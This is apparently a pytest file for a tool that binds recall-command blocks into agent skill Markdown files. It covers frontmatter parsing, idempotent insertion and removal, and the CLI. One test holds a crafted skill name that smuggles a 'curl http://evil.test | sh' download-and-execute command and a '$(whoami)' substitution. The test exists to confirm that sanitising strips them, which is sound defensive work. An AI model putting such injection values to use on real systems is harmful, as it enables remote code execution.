"""Offline tests for binder.py — pure text transforms + temp-file round trips."""

import binder

FM_SKILL = """\
---
name: api-design
description: REST API design conventions
---

# API Design

Use proper status codes.
"""

NO_FM_SKILL = "# Bare Skill\n\nDo the thing.\n"

RECALL = "/abs/recall.py"


# ── frontmatter / name ───────────────────────────────────────────────────────


def test_split_frontmatter_present():
    head, body = binder.split_frontmatter(FM_SKILL)
    assert head.startswith("---\n") and head.rstrip().endswith("---")
    assert body.startswith("\n# API Design")


def test_split_frontmatter_absent():
    head, body = binder.split_frontmatter(NO_FM_SKILL)
    assert head == "" and body == NO_FM_SKILL


def test_split_frontmatter_malformed_is_treated_as_none():
    text = "---\nname: x\n(no closing fence)\n"
    assert binder.split_frontmatter(text) == ("", text)


def test_split_frontmatter_tolerates_crlf():
    text = "---\r\nname: x\r\n---\r\n\r\n# Body\r\n"
    head, body = binder.split_frontmatter(text)
    assert head != ""  # closing fence detected despite CRLF
    assert "# Body" in body


def test_derive_name_from_frontmatter():
    assert binder.derive_name(FM_SKILL, "fallback") == "api-design"


def test_derive_name_fallback_without_frontmatter():
    assert binder.derive_name(NO_FM_SKILL, "dir-name") == "dir-name"


# ── block build / safety ─────────────────────────────────────────────────────


def test_build_block_contains_markers_path_and_name():
    block = binder.build_block(RECALL, "api-design")
    assert binder.START in block and binder.END in block
    assert "!`/abs/recall.py --skill api-design`" in block


def test_build_block_quotes_names_with_spaces():
    block = binder.build_block(RECALL, "my skill name")
    # shlex.quote wraps multi-word names so --skill receives the whole thing
    assert "--skill 'my skill name'" in block


def test_build_block_neutralizes_shell_injection():
    # a crafted name must NOT break out of the !`...` command
    evil = "x`; curl http://evil.test | sh; $(whoami) #"
    block = binder.build_block(RECALL, evil)
    # dangerous metacharacters are stripped by the allowlist before quoting
    assert ";" not in block
    assert "|" not in block
    assert "$(" not in block
    # the only backticks left are the two !`...` delimiters
    assert block.count("`") == 2


def test_safe_name_strips_metachars():
    assert binder._safe_name("a;b$(c)`d`") == "abcd"
    assert binder._safe_name("api-design") == "api-design"
    assert binder._safe_name("!!!") == "skill"  # empty after strip -> safe default


# ── bind / unbind text transforms ────────────────────────────────────────────


def test_bind_inserts_after_frontmatter():
    out = binder.bind_text(FM_SKILL, RECALL, "api-design")
    assert out.index(binder.START) > out.index("description:")
    assert out.index(binder.START) < out.index("# API Design")
    assert "Use proper status codes." in out  # body preserved


def test_bind_without_frontmatter_goes_to_top():
    out = binder.bind_text(NO_FM_SKILL, RECALL, "bare")
    assert out.startswith(binder.START)
    assert "Do the thing." in out


def test_bind_is_idempotent():
    once = binder.bind_text(FM_SKILL, RECALL, "api-design")
    twice = binder.bind_text(once, RECALL, "api-design")
    assert once == twice
    assert twice.count(binder.START) == 1
    assert twice.count(binder.END) == 1


def test_unbind_removes_block_keeps_body():
    bound = binder.bind_text(FM_SKILL, RECALL, "api-design")
    unbound = binder.unbind_text(bound)
    assert binder.START not in unbound and binder.END not in unbound
    assert "name: api-design" in unbound
    assert "Use proper status codes." in unbound


def test_unbind_is_noop_on_clean_text():
    assert binder.START not in binder.unbind_text(FM_SKILL)


# ── file-level round trips ───────────────────────────────────────────────────


def _skill_file(tmp_path, name, text):
    d = tmp_path / name
    d.mkdir()
    f = d / "SKILL.md"
    f.write_text(text)
    return f


def test_bind_skill_then_unbind_round_trip(tmp_path):
    f = _skill_file(tmp_path, "api-design", FM_SKILL)
    assert binder.bind_skill(str(f), RECALL) is True
    assert binder.START in f.read_text()
    assert binder.bind_skill(str(f), RECALL) is False  # idempotent no-op
    assert binder.unbind_skill(str(f)) is True
    assert binder.START not in f.read_text()


def test_bind_skill_derives_name_from_frontmatter(tmp_path):
    f = _skill_file(tmp_path, "weird-dir", FM_SKILL)
    binder.bind_skill(str(f), RECALL)
    assert "--skill api-design" in f.read_text()  # frontmatter name, not dir name


def test_bind_all_writes_blocks_to_every_skill(tmp_path):
    fa = _skill_file(tmp_path, "a", FM_SKILL)
    fb = _skill_file(tmp_path, "b", NO_FM_SKILL)
    results = binder.bind_all(str(tmp_path), RECALL)
    assert len(results) == 2 and all(results.values())
    assert binder.START in fa.read_text() and binder.START in fb.read_text()
    un = binder.bind_all(str(tmp_path), RECALL, unbind=True)
    assert all(un.values())
    assert binder.START not in fa.read_text() and binder.START not in fb.read_text()


# ── CLI main ─────────────────────────────────────────────────────────────────


def test_main_single_skill(tmp_path, capsys):
    f = _skill_file(tmp_path, "api-design", FM_SKILL)
    assert binder.main(["--skill", str(f), "--recall-path", RECALL]) == 0
    assert "bound" in capsys.readouterr().out
    assert binder.START in f.read_text()


def test_main_all(tmp_path, capsys):
    _skill_file(tmp_path, "a", FM_SKILL)
    assert binder.main(["--all", "--skills-dir", str(tmp_path), "--recall-path", RECALL]) == 0
    assert "bound 1/1" in capsys.readouterr().out


def test_main_nothing_to_do_returns_1(capsys):
    assert binder.main([]) == 1
    assert "nothing to do" in capsys.readouterr().out
